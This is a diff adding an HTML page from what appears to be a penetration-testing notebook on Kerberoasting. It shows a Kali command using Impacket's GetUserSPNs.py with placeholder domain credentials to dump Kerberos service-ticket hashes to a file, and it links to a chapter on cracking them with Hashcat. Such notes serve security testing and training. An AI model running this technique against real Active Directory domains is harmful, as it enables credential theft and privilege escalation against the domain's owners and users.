@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Linux Impacket GetUserSPNs.py</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Linux Impacket GetUserSPNs.py</h1><br/><br />Github: <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py</a><br /><br /><strong>Usage of GetUserSPNs.py</strong><br /><a href=""><img src="images/1141-1.png" alt="images/1141-1.png" /></a><br /><br /><div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<span style="color:#ff9d00;font-weight:700">/</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 .<span style="color:#ff9d00;font-weight:700">/</span>GetUserSPNs.py [domain]<span style="color:#ff9d00;font-weight:700">/</span>[user]<span style="color:#ff9d00;font-weight:700">:</span>[password] -dc-ip [IpDomainController] -outputfile [hashFile]</pre></div><br />    <a href=""><img src="images/1141-2.png" alt="images/1141-2.png" /></a><br />    We can crack the hash in the output file with Hashcat <a href="ge_Escalation--Active_Directory(Windows)_Privilege_Escalation--Kerberos_Authentication_Attacks--Kerberoasting--Rebeus--Crack_with_Hashcat.html">as seen in the chapter of Rebeus</a><br />    <a href=""><img src="images/1141-3.png" alt="images/1141-3.png" /></a></div>
+</body>
+</html>
